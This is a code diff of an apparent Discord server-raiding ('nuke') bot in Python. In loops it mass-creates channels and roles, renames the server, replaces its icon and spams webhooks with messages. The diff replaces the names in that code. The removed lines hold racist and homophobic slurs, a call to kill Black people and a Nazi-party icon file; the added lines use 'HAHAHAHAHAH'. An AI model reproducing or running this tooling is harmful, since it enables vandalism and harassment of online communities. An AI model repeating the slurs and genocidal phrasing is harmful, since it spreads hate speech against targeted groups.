@@ -146,7 +146,7 @@ async def on_connect():
             try:
                 for i in range(50):
                     await ctx.guild.create_text_channel(name="HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA")
-                    await ctx.guild.create_voice_channel(name="FUCK YOU HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA")
+                    await ctx.guild.create_voice_channel(name="HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA")
             except:
                 print("Unable to create channels, you likely don't have permission.")
 
@@ -227,9 +227,9 @@ async def on_connect():
 
         for i in range(50):
             try:
-                await ctx.guild.create_role(name=f"FUCK YOU NIGGER")
-                await ctx.guild.create_text_channel(name=f"GET FUCKED FAGGOT")
-                await ctx.guild.create_voice_channel(name=f"GET FUCKED BITCH")
+                await ctx.guild.create_role(name=f"HAHAHAHAHAH")
+                await ctx.guild.create_text_channel(name=f"HAHAHAHAHAH")
+                await ctx.guild.create_voice_channel(name=f"HAHAHAHAHAH")
             except:
                 print("Unable to create roles, you likely don't have permission.")
 
@@ -237,8 +237,8 @@ async def on_connect():
         print("Mass channel creation has finished.")
 
         try:
-            await ctx.guild.edit(name="KILL ALL NIGGERS")
-            with open('NSDAP.png', 'rb') as f:
+            await ctx.guild.edit(name="HAHAHAHAHAH")
+            with open('image.png', 'rb') as f:
                 icon = f.read()
                 await ctx.guild.edit(icon=icon)
         except:
@@ -260,7 +260,7 @@ async def on_connect():
             hook = random.choice(hooks)
             data={}
             data["content"] = random.choice(m.messages)
-            data["username"] = "ARKANSAS"
+            data["username"] = "HAHAHAHAHAH"
             try:
                 requests.post(hook, data=json.dumps(data))
             except Exception as e:
